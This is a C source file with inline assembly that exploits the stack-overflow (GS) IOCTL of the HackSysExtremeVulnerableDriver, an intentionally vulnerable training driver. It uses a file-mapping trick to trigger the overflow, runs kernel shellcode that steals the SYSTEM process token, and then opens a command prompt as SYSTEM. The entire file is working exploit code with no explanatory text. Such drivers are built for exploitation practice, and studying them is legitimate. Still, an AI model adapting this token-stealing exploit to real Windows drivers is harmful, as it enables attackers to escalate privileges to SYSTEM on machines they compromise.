#include <windows.h>
#include <stdio.h>

#define FILEMAP_SIZE 4096
#define BUF_SIZE 544
#define STACKOVERFLOW_GS 0x222007

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

VOID ShellCode()
{
	__asm
	{
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
					 mov eax, [eax + 0b8h]
					 sub eax, 0b8h
					 cmp[eax + 0b4h], edx
					 jnz find_sys_pid

					 mov edx, [eax + 0f8h]
					 mov[ecx + 0f8h], edx
					 popad
					 add esp, 0x78c				; Offset of IRP on stack
					 mov edi, DWORD PTR[esp]	; Restore the pointer to IRP
					 add esp, 0x8				; Offset of DbgPrint string
					 mov ebx, DWORD PTR[esp]	; Restore the DbgPrint string
					 add esp, 0x234				; Target frame to ret
					 xor eax, eax
					 pop ebp					; Restore saved EBP
					 ret 8
	}
}

int main()
{
	LPVOID lpvPayload;
	HANDLE hDevice;
	HANDLE hMapFile;
	LPVOID pBuf = NULL;
	BOOL bResult = FALSE;
	LPVOID lpOverflowBuffer;

	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);							// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		printf("[+] Failed to get handle...!\n");
		return 0;
	}

	printf("[+] Allocating ShellCode");

	lpvPayload = VirtualAlloc(
		NULL,						// Next page to commit
		0x100,						// Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access

	if (lpvPayload == NULL)
	{
		printf("\n[+] Failed to alloc Memory!\n");
		system("pause");
		return -1;
	}

	printf(" -> Done!\n");

	memcpy(lpvPayload, ShellCode, 0x100);

	printf("[+] Trying to create a File Mapping Object");

	hMapFile = CreateFileMapping(
		INVALID_HANDLE_VALUE,    // Use paging file
		NULL,                    // Default security
		PAGE_EXECUTE_READWRITE,  // Read/write/execute access
		0,                       // Maximum object size (high-order DWORD)
		FILEMAP_SIZE,            // Maximum object size (low-order DWORD)
		NULL
	);

	if (hMapFile == NULL)
	{
		printf("\n[+] Failed to create file mapping object\n");
		system("pause");
		return -1;
	}
	
	printf(" -> Done!\n");

	printf("[+] Map a view of the File in the current Process address space");

	pBuf = MapViewOfFile(
		hMapFile,				// Handle to map object
		FILE_MAP_ALL_ACCESS,	// Read/write permission
		0,
		0,
		FILEMAP_SIZE
	);

	if (pBuf == NULL)
	{
		printf("\n[+] Failed to Map a view of the File\n");
		CloseHandle(hMapFile);
		system("pause");
		return -1;
	}

	printf(" -> Done!\n");

	memset(pBuf, 0x41, FILEMAP_SIZE);
	lpOverflowBuffer = (LPVOID)((ULONG)pBuf + (FILEMAP_SIZE - BUF_SIZE));
	// fill with shellcode
	for (unsigned int i = 0; i < BUF_SIZE; i += 4)
		* ((PULONG)((ULONG)lpOverflowBuffer + i)) = (ULONG)lpvPayload;

	DWORD bReturn = 0;                     

	DeviceIoControl(
		hDevice,
		STACKOVERFLOW_GS,						
		lpOverflowBuffer, 
		BUF_SIZE + 4,
		NULL,
		0,								
		&bReturn,							
		(LPOVERLAPPED)NULL);			

	CreateCmd();

	CloseHandle(hMapFile);
	CloseHandle(hDevice);

	system("pause");
	return 0;
}